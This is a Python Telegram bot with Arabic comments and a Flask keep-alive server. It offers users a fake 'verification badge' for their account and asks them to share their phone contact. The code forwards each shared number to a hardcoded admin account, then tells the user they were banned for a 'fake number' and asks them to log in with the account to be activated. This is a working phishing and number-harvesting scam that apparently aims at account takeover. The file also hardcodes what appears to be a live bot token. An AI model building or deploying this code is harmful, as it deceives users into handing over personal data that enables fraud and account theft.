from flask import Flask
import threading
import os

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is alive!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_web, daemon=True).start()
# بوت توثيق الحسابات - نسخة محولة من PHP إلى Python
# جميع الحقوق محفوظة للمطور: WHISKY ELYOUTUBER

import telebot
from telebot import types
import os
import sys
import time
import json
import logging
from datetime import datetime

# ==================== إعدادات البوت ====================

BOT_TOKEN = "9288165992:AAFb7F5ovAPu5jheICc8uQCB5KoL5MtUaq4"
DEVELOPER_NAME = "𝑾𝑯𝑰𝑺𝑲𝒀 𝑬𝑳𝒀𝑶𝑼𝑻𝑼𝑩𝑬𝑹"
DEVELOPER_USERNAME = "@sayouda220309"
DEVELOPER_LINK = "https://t.me/sayouda220309"
CHANNEL_LINK = "https://t.me/Whiskybots"
ADMIN_ID = 5746902243  # ايديك من ملف PHP

# ==================== إعداد المسارات ====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ID_FILE = os.path.join(BASE_DIR, "idAMR.txt")
LOG_FILE = os.path.join(BASE_DIR, "bot.log")
UPDATE_FILE = os.path.join(BASE_DIR, "update.txt")

# ==================== إعداد التسجيل ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ==================== تهيئة البوت ====================
bot = telebot.TeleBot(BOT_TOKEN)

# ==================== دوال مساعدة ====================

def read_banned_ids():
    """قراءة قائمة المعرفات المحظورة من الملف"""
    try:
        if not os.path.exists(ID_FILE):
            return []
        with open(ID_FILE, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            if content:
                return [line.strip() for line in content.split('\n') if line.strip()]
            return []
    except Exception as e:
        logger.error(f"خطأ في قراءة الملف: {e}")
        return []

def add_banned_id(chat_id):
    """إضافة معرف إلى قائمة المحظورين"""
    try:
        banned_ids = read_banned_ids()
        if str(chat_id) not in banned_ids:
            with open(ID_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{chat_id}\n")
            return True
        return False
    except Exception as e:
        logger.error(f"خطأ في إضافة المعرف: {e}")
        return False

def is_banned(chat_id):
    """التحقق مما إذا كان المعرف محظوراً"""
    banned_ids = read_banned_ids()
    return str(chat_id) in banned_ids

def save_update(update):
    """حفظ التحديث في ملف (مثل PHP)"""
    try:
        with open(UPDATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(update, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"خطأ في حفظ التحديث: {e}")

# ==================== دالة إعداد الويب هوك ====================
def setup_webhook():
    """إعداد webhook (وظيفة اختيارية)"""
    try:
        import requests
        webhook_url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
        current_url = f"https://{os.environ.get('SERVER_NAME', 'localhost')}{os.environ.get('SCRIPT_NAME', '/')}"
        
        response = requests.post(webhook_url, data={'url': current_url})
        result = response.json()
        
        if result.get('ok'):
            logger.info(f"✅ تم إعداد webhook بنجاح: {current_url}")
            print(f"setWebhook ~> {webhook_url}?url={current_url}")
        else:
            logger.error(f"❌ فشل إعداد webhook: {result}")
            
        return result
    except Exception as e:
        logger.error(f"خطأ في إعداد webhook: {e}")
        return None

# ==================== معالج أمر /start ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    """معالج أمر /start"""
    chat_id = message.chat.id
    message_id = message.message_id
    
    logger.info(f"📱 مستخدم جديد: {chat_id}")
    save_update(message.json)  # حفظ التحديث مثل PHP
    
    # التحقق مما إذا كان المستخدم محظوراً
    if is_banned(chat_id):
        bot.send_message(
            chat_id,
            "*يرجي تسجيل الدخول بالحساب المراد تفعيله*",
            parse_mode='Markdown'
        )
        return
    
    # صورة الترحيب
    welcome_photo = "https://t.me/test5579/3"
    
    # نص الترحيب
    welcome_text = f"""
اهلا بك في اول بوت عربي لأضافة علامه التوثيق بجوار حسابك
التوثيق لا يعمل لكل الحسابات

━━━━━━━━━━━━━━━━━━━━━━
👤 **المطور:** {DEVELOPER_NAME}
📢 **القناة:** [اضغط هنا]({CHANNEL_LINK})
📞 **للتواصل:** [مراسلة المطور]({DEVELOPER_LINK})
━━━━━━━━━━━━━━━━━━━━━━

اضغط على الزر أدناه للتسجيل 👇
"""
    
    # إنشاء لوحة المفاتيح مع طلب رقم الهاتف
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    contact_button = types.KeyboardButton("📱 اضغط هنا للتسجيل", request_contact=True)
    markup.add(contact_button)
    
    # إرسال الصورة مع النص
    try:
        bot.send_photo(
            chat_id,
            welcome_photo,
            caption=welcome_text,
            reply_markup=markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        # إذا فشل إرسال الصورة، أرسل نصاً فقط
        logger.error(f"خطأ في إرسال الصورة: {e}")
        bot.send_message(
            chat_id,
            welcome_text,
            reply_markup=markup,
            parse_mode='Markdown'
        )

# ==================== معالج أرقام الهواتف ====================
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """معالج مشاركة رقم الهاتف"""
    chat_id = message.chat.id
    from_id = message.from_user.id
    contact = message.contact
    
    logger.info(f"📞 استلام رقم هاتف من {chat_id}")
    save_update(message.json)  # حفظ التحديث مثل PHP
    
    # التحقق من أن المستخدم شارك رقمه الخاص
    if contact.user_id == from_id:
        # إعادة توجيه الرسالة إلى المشرف
        try:
            bot.forward_message(
                ADMIN_ID,
                chat_id,
                message.message_id
            )
            logger.info(f"✅ تم إعادة توجيه رقم المستخدم {chat_id} إلى المشرف")
        except Exception as e:
            logger.error(f"❌ خطأ في إعادة التوجيه: {e}")
        
        # إضافة المستخدم إلى قائمة المحظورين
        add_banned_id(chat_id)
        
        # إرسال رسالة الحظر
        bot.send_message(
            chat_id,
            "*تم حظرك لاستخدمك رقم وهمي ❌*",
            parse_mode='Markdown'
        )
        
        logger.info(f"⛔ تم حظر المستخدم {chat_id}")
    else:
        # إذا شارك المستخدم رقم شخص آخر
        bot.send_message(
            chat_id,
            "❌ يرجى مشاركة رقمك الخاص فقط!",
            reply_markup=types.ReplyKeyboardRemove()
        )

# ==================== معالج الرسائل النصية ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    """معالج جميع الرسائل النصية"""
    chat_id = message.chat.id
    text = message.text
    
    save_update(message.json)  # حفظ التحديث مثل PHP
    
    # إذا كان المستخدم محظوراً، أظهر رسالة خاصة
    if is_banned(chat_id):
        bot.send_message(
            chat_id,
            "*يرجي تسجيل الدخول بالحساب المراد تفعيله*",
            parse_mode='Markdown'
        )
        return
    
    # لأي رسالة أخرى، أعد توجيه المستخدم إلى /start
    send_welcome(message)

# ==================== أمر خاص للمشرف (اختياري) ====================
@bot.message_handler(commands=['admin'])
def admin_command(message):
    """أمر خاص للمشرف لعرض الإحصائيات"""
    chat_id = message.chat.id
    
    if chat_id != ADMIN_ID:
        bot.reply_to(message, "⛔ هذا الأمر للمشرف فقط!")
        return
    
    banned_ids = read_banned_ids()
    banned_count = len(banned_ids)
    
    stats_text = f"""
📊 **إحصائيات البوت**

━━━━━━━━━━━━━━━━━━━━━━

👤 **المطور:** {DEVELOPER_NAME}
🆔 **معرفك:** `{ADMIN_ID}`
📊 **عدد المحظورين:** {banned_count}

━━━━━━━━━━━━━━━━━━━━━━

**📋 قائمة المحظورين:**
"""
    
    if banned_count > 0:
        for i, uid in enumerate(banned_ids[:10], 1):
            stats_text += f"{i}. `{uid}`\n"
        if banned_count > 10:
            stats_text += f"... و{banned_count - 10} آخرين"
    else:
        stats_text += "لا يوجد محظورين"
    
    bot.reply_to(message, stats_text, parse_mode='Markdown')

# ==================== أمر مسح المحظورين (للمشرف) ====================
@bot.message_handler(commands=['clear'])
def clear_command(message):
    """أمر مسح قائمة المحظورين"""
    chat_id = message.chat.id
    
    if chat_id != ADMIN_ID:
        bot.reply_to(message, "⛔ هذا الأمر للمشرف فقط!")
        return
    
    try:
        open(ID_FILE, 'w').close()  # تفريغ الملف
        bot.reply_to(message, "✅ تم مسح قائمة المحظورين بنجاح!")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: {e}")

# ==================== وظيفة إعداد webhook عند التشغيل (اختياري) ====================
def print_webhook_info():
    """طباعة معلومات webhook (مثل PHP)"""
    try:
        import requests
        webhook_url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
        server_name = os.environ.get('SERVER_NAME', 'your-server.com')
        script_name = os.environ.get('SCRIPT_NAME', '/path/to/script')
        full_url = f"https://{server_name}{script_name}"
        
        print(f"\n{'='*60}")
        print(f"🔗 رابط إعداد webhook:")
        print(f"{webhook_url}?url={full_url}")
        print(f"{'='*60}\n")
    except:
        pass

# ==================== التشغيل الرئيسي ====================
if __name__ == "__main__":
    print("=" * 60)
    print(f"🚀 {DEVELOPER_NAME}")
    print(f"👤 المطور: {DEVELOPER_USERNAME}")
    print(f"📢 القناة: {CHANNEL_LINK}")
    print("=" * 60)
    print("🔄 بوت توثيق الحسابات")
    print("=" * 60)
    
    # طباعة معلومات webhook (مثل PHP)
    print_webhook_info()
    
    # التحقق من صحة التوكن
    try:
        bot_info = bot.get_me()
        print(f"✅ البوت يعمل: @{bot_info.username}")
        print(f"🆔 معرف البوت: {bot_info.id}")
        print(f"📁 ملف المحظورين: {ID_FILE}")
        print("=" * 60)
    except Exception as e:
        print(f"❌ خطأ في التوكن: {e}")
        sys.exit(1)
    
    print("🔄 جاري تشغيل البوت...")
    print("=" * 60)
    
    # تشغيل البوت مع إعادة المحاولة
    retry_count = 0
    max_retries = 5
    
    while retry_count < max_retries:
        try:
            bot.infinity_polling(
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True
            )
        except Exception as e:
            retry_count += 1
            logger.error(f"❌ خطأ في التشغيل: {e}")
            logger.info(f"⏳ إعادة المحاولة {retry_count}/{max_retries} بعد 5 ثواني...")
            time.sleep(5)
    
    logger.critical("❌ توقف البوت بعد 5 محاولات فاشلة")
